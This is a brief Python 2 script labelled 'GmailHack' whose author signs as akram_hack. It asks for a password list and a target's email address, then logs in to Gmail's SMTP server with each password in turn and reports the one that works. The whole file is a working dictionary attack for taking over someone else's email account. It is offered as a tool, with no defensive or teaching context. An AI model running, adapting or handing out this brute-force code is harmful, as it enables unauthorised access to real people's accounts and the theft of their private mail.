#!/usr/bin/python
# By akram_hack                                             

print ("############################################################")
print ("#                                                          #")
print ("#    		         BY Akram_Hack                     #")
print ("#    							   #")
print ("#   		           GmailHack                       #")
print ("#                                                          #")
print ("############################################################")


import smtplib

file_path = raw_input('Password File :')
passwfile = open(file_path,'r')
pass_lst = passwfile.readlines()

def login():
    i = 0
    usr = raw_input('targets email :')
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    for passw in pass_lst:
      i = i + 1
      print str(i) + '/' + str(len(pass_lst))
      try:
         server.login(usr, passw)
         print '[+] Password Found: %s ' % passw
         break
      except smtplib.SMTPAuthenticationError as e:
         error = str(e)
         if error[14] == '<':
            print '[+] Password Found: %s ' % passw
            break
         else:
            print '[!] Password Incorrect: %s ' % passw
login()
